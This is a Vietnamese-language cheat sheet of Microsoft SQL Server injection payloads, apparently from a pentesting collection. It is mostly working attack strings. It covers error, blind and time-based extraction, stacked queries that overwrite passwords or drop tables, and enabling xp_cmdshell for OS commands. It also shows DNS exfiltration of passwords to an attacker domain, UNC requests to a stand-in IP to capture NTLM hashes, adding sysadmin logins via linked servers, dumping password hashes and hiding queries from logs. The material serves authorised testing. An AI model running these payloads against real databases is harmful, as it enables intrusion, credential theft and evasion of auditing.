# MSSQL Injection

> MSSQL Injection là một loại lỗ hổng bảo mật có thể xảy ra khi kẻ tấn công có thể chèn ("inject") mã SQL độc hại vào một câu truy vấn được thực thi bởi cơ sở dữ liệu Microsoft SQL Server (MSSQL). Điều này thường xảy ra khi dữ liệu đầu vào của người dùng được đưa trực tiếp vào câu truy vấn SQL mà không được kiểm tra, làm sạch hoặc tham số hóa đúng cách. SQL Injection có thể dẫn đến những hậu quả nghiêm trọng như truy cập dữ liệu trái phép, thao túng dữ liệu, và thậm chí là chiếm quyền kiểm soát máy chủ cơ sở dữ liệu.

## Tóm tắt

* [Các cơ sở dữ liệu mặc định của MSSQL](#mssql-default-databases)
* [Chú thích trong MSSQL](#mssql-comments)
* [Liệt kê thông tin MSSQL](#mssql-enumeration)
    * [Liệt kê cơ sở dữ liệu MSSQL](#mssql-list-databases)
    * [Liệt kê bảng MSSQL](#mssql-list-tables)
    * [Liệt kê cột MSSQL](#mssql-list-columns)
* [Khai thác dựa trên Union](#mssql-union-based)
* [Khai thác dựa trên lỗi](#mssql-error-based)
* [Khai thác dạng mù (Blind)](#mssql-blind-based)
    * [Khai thác mù tương đương với Substring](#mssql-blind-with-substring-equivalent)
* [Khai thác dựa trên thời gian](#mssql-time-based)
* [Truy vấn xếp chồng (Stacked Query)](#mssql-stacked-query)
* [Thao tác tập tin MSSQL](#mssql-file-manipulation)
    * [Đọc tập tin MSSQL](#mssql-read-file)
    * [Ghi tập tin MSSQL](#mssql-write-file)
* [Thực thi lệnh trên MSSQL](#mssql-command-execution)
    * [XP_CMDSHELL](#xp_cmdshell)
    * [Script Python](#python-script)
* [MSSQL Out of Band](#mssql-out-of-band)
    * [Trích xuất dữ liệu qua DNS trên MSSQL](#mssql-dns-exfiltration)
    * [Đường dẫn UNC của MSSQL](#mssql-unc-path)
* [Các liên kết đáng tin cậy (Trusted Links) của MSSQL](#mssql-trusted-links)
* [Quyền hạn trong MSSQL](#mssql-privileges)
    * [Liệt kê quyền hạn MSSQL](#mssql-list-permissions)
    * [Biến người dùng thành DBA trong MSSQL](#mssql-make-user-dba)
* [Thông tin xác thực cơ sở dữ liệu MSSQL](#mssql-database-credentials)
* [Bảo mật vận hành (OPSEC) trong MSSQL](#mssql-opsec)
* [Tài liệu tham khảo](#references)

## Các cơ sở dữ liệu mặc định của MSSQL

| Tên                 | Mô tả                                  |
| ------------------- | --------------------------------------- |
| pubs                | Không có sẵn trong MSSQL 2005           |
| model               | Có sẵn trong tất cả các phiên bản       |
| msdb                | Có sẵn trong tất cả các phiên bản       |
| tempdb              | Có sẵn trong tất cả các phiên bản       |
| northwind           | Có sẵn trong tất cả các phiên bản       |
| information_schema  | Có sẵn từ MSSQL 2000 trở lên            |

## Chú thích trong MSSQL

| Loại                    | Mô tả              |
| ------------------------ | ------------------ |
| `/* MSSQL Comment */`   | Chú thích kiểu C    |
| `--`                    | Chú thích dạng SQL  |
| `;%00`                  | Byte null           |

## Liệt kê thông tin MSSQL

| Mô tả                    | Câu truy vấn SQL                          |
| ------------------------- | ------------------------------------------- |
| Phiên bản DBMS            | `SELECT @@version`                        |
| Tên cơ sở dữ liệu         | `SELECT DB_NAME()`                        |
| Schema cơ sở dữ liệu      | `SELECT SCHEMA_NAME()`                    |
| Tên máy chủ (Hostname)    | `SELECT HOST_NAME()`                      |
| Tên máy chủ (Hostname)    | `SELECT @@hostname`                       |
| Tên máy chủ (Hostname)    | `SELECT @@SERVERNAME`                     |
| Tên máy chủ (Hostname)    | `SELECT SERVERPROPERTY('productversion')` |
| Tên máy chủ (Hostname)    | `SELECT SERVERPROPERTY('productlevel')`   |
| Tên máy chủ (Hostname)    | `SELECT SERVERPROPERTY('edition')`        |
| Người dùng                | `SELECT CURRENT_USER`                     |
| Người dùng                | `SELECT user_name();`                     |
| Người dùng                | `SELECT system_user;`                     |
| Người dùng                | `SELECT user;`                            |

### Liệt kê cơ sở dữ liệu MSSQL

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

### Liệt kê bảng MSSQL

```sql
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

### Liệt kê cột MSSQL

```sql
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

## Khai thác dựa trên Union

* Trích xuất tên các cơ sở dữ liệu

    ```sql
    $ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
    ```

* Trích xuất các bảng từ cơ sở dữ liệu Injection

    ```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ```

* Trích xuất các cột của bảng Users

    ```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ```

* Cuối cùng trích xuất dữ liệu

    ```sql
    SELECT  UserId, UserName from Users
    ```

## Khai thác dựa trên lỗi

| Tên      | Payload                                                          |
| -------- | ---------------------------------------------------------------- |
| CONVERT  | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
| IN       | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -`         |
| EQUAL    | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -`               |
| CAST     | `CAST((SELECT @@version) AS INT)`                                |

* Đối với dữ liệu đầu vào dạng số nguyên

    ```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
    ```

* Đối với dữ liệu đầu vào dạng chuỗi

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ```

## Khai thác dạng mù (Blind)

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

### Khai thác mù tương đương với Substring

| Hàm         | Ví dụ                                    |
| ----------- | ----------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |

Ví dụ:

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

## Khai thác dựa trên thời gian

Trong một cuộc tấn công SQL injection mù dựa trên thời gian, kẻ tấn công chèn một payload sử dụng `WAITFOR DELAY` để khiến cơ sở dữ liệu tạm dừng trong một khoảng thời gian nhất định. Sau đó, kẻ tấn công quan sát thời gian phản hồi để suy luận xem payload được chèn vào có thực thi thành công hay không.

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

## Truy vấn xếp chồng (Stacked Query)

* Truy vấn xếp chồng không cần dấu kết thúc câu lệnh

    ```sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* Dùng dấu chấm phẩy "`;`" để thêm một truy vấn khác

    ```sql
    ProductID=1; DROP members--
    ```

## Thao tác tập tin MSSQL

### Đọc tập tin MSSQL

**Quyền hạn**: Tùy chọn `BULK` yêu cầu quyền `ADMINISTER BULK OPERATIONS` hoặc `ADMINISTER DATABASE BULK OPERATIONS`.

```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

Ví dụ:

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

### Ghi tập tin MSSQL

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

## Thực thi lệnh trên MSSQL

### XP_CMDSHELL

`xp_cmdshell` là một thủ tục lưu trữ (stored procedure) hệ thống trong Microsoft SQL Server cho phép chạy các lệnh hệ điều hành trực tiếp từ bên trong T-SQL (Transact-SQL).

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

Nếu cần kích hoạt lại `xp_cmdshell`, mặc định nó đã bị vô hiệu hóa trong SQL Server 2005.

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Script Python

> Được thực thi bởi một người dùng khác với người dùng đang sử dụng `xp_cmdshell` để thực thi lệnh

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

## MSSQL Out of Band

### Trích xuất dữ liệu qua DNS trên MSSQL

Kỹ thuật từ [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)

* **Quyền hạn**: Yêu cầu quyền `VIEW SERVER STATE` trên máy chủ.

    ```powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.xem',null,null))
    ```

* **Quyền hạn**: Yêu cầu quyền `CONTROL SERVER`.

    ```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.trc',default))
    ```

### Đường dẫn UNC của MSSQL

MSSQL hỗ trợ truy vấn xếp chồng nên ta có thể tạo một biến trỏ đến địa chỉ IP của mình rồi dùng hàm `xp_dirtree` để liệt kê các tập tin trong SMB share và lấy được hash NTLMv2.

```sql
1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';-- 
```

```sql
xp_dirtree '\\10.10.10.10\file'
xp_fileexist '\\10.10.10.10\file'
BACKUP LOG [TESTING] TO DISK = '\\10.10.10.10\file'
BACKUP DATABASE [TESTING] TO DISK = '\\10.10.10.10\file'
RESTORE LOG [TESTING] FROM DISK = '\\10.10.10.10\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\10.10.10.10\file'
RESTORE HEADERONLY FROM DISK = '\\10.10.10.10\file'
RESTORE FILELISTONLY FROM DISK = '\\10.10.10.10\file'
RESTORE LABELONLY FROM DISK = '\\10.10.10.10\file'
RESTORE REWINDONLY FROM DISK = '\\10.10.10.10\file'
RESTORE VERIFYONLY FROM DISK = '\\10.10.10.10\file'
```

## Các liên kết đáng tin cậy (Trusted Links) của MSSQL

Một liên kết đáng tin cậy trong Microsoft SQL Server là một mối quan hệ máy chủ liên kết (linked server) cho phép một thực thể SQL Server thực thi truy vấn và thậm chí các thủ tục từ xa trên một máy chủ khác (hoặc nguồn OLE DB bên ngoài) như thể máy chủ từ xa đó là một phần của môi trường cục bộ. Các máy chủ liên kết cung cấp các tùy chọn kiểm soát việc có cho phép các thủ tục từ xa và lệnh gọi RPC hay không, cùng với bối cảnh bảo mật nào được dùng trên máy chủ từ xa.

> Các liên kết giữa các cơ sở dữ liệu hoạt động ngay cả qua các mối quan hệ tin cậy (trust) giữa các rừng (forest).

* Tìm các liên kết bằng `sysservers`: chứa một hàng cho mỗi máy chủ mà một thực thể SQL Server có thể truy cập như một nguồn dữ liệu OLE DB.

    ```sql
    select * from master..sysservers
    ```

* Thực thi truy vấn thông qua liên kết

    ```sql
    select * from openquery("dcorp-sql1", 'select * from master..sysservers')
    select version from openquery("linkedserver", 'select @@version as version')

    -- Chain multiple openquery
    select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
    ```

* Thực thi lệnh shell

    ```sql
    -- Enable xp_cmdshell and execute "dir" command
    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
    select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

    -- Create a SQL user and give sysadmin privileges
    EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
    ```

## Quyền hạn trong MSSQL

### Liệt kê quyền hạn MSSQL

* Liệt kê các quyền hiệu lực của người dùng hiện tại trên máy chủ.

    ```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
    ```

* Liệt kê các quyền hiệu lực của người dùng hiện tại trên cơ sở dữ liệu.

    ```sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
    ```

* Liệt kê các quyền hiệu lực của người dùng hiện tại trên một view.

    ```sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
    ```

* Kiểm tra xem người dùng hiện tại có phải là thành viên của vai trò máy chủ được chỉ định hay không.

    ```sql
    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
    ```

### Biến người dùng thành DBA trong MSSQL

```sql
EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';
```

## Thông tin xác thực cơ sở dữ liệu MSSQL

* **MSSQL 2000**: Chế độ Hashcat 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`

    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ```

* **MSSQL 2005**: Chế độ Hashcat 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`

    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

## Bảo mật vận hành (OPSEC) trong MSSQL

Dùng `SP_PASSWORD` trong truy vấn để ẩn khỏi nhật ký (log) như sau: `' AND 1=1--sp_password`

```sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```

## Tài liệu tham khảo

* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://web.archive.org/web/20240219205617/https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
* [Error based SQL Injection in "Order By" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://web.archive.org/web/20260222213546/https://www.exploit-db.com/papers/12975)
* [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://web.archive.org/web/20220906233249/https://docs.microsoft.com/en-us/SQL/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
* [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](https://web.archive.org/web/20260214013447/https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [MSSQL Trusted Links - HackTricks - September 15, 2024](https://web.archive.org/web/20241126085555/https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
* [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://web.archive.org/web/20210227063841/https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://web.archive.org/web/20220907211545/https://docs.microsoft.com/en-us/SQL/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
